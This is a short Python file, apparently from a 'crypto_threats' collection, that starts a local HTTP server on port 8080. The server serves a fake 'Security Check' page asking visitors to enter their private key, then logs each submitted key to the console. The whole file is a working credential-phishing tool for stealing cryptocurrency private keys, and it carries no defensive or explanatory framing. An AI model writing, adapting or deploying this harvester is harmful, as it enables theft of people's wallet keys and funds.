
# File: crypto_threats/phishing_dropper.py
import http.server
import socketserver
from rich.console import Console
from rich.panel import Panel

console = Console()
PORT = 8080

HTML_CONTENT = '''
<html><body style="font-family: Arial; text-align:center; margin-top:50px;">
<h1>Security Check</h1>
<p>Please enter your private key to continue:</p>
<form method="post"><input type="text" name="key" style="width:300px;"></form>
</body></html>
'''

class PhishHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        console.print(Panel(f"[bold red]Serving phishing page to {self.client_address[0]}[/bold red]", border_style="red"))
        self.send_response(200)
        self.send_header('Content-Type','text/html')
        self.end_headers()
        self.wfile.write(HTML_CONTENT.encode())
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(length).decode()
        console.log(f"[yellow]Captured key:[/yellow] {post_data}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"<h2>Thank you!</h2>")

if __name__ == '__main__':
    console.print(Panel("[bold magenta]Phishing Dropper Started[/bold magenta]", border_style="magenta"))
    with socketserver.TCPServer(('', PORT), PhishHandler) as httpd:
        console.print(f"[bold]Listening on http://localhost:{PORT}[/bold]")
        httpd.serve_forever()

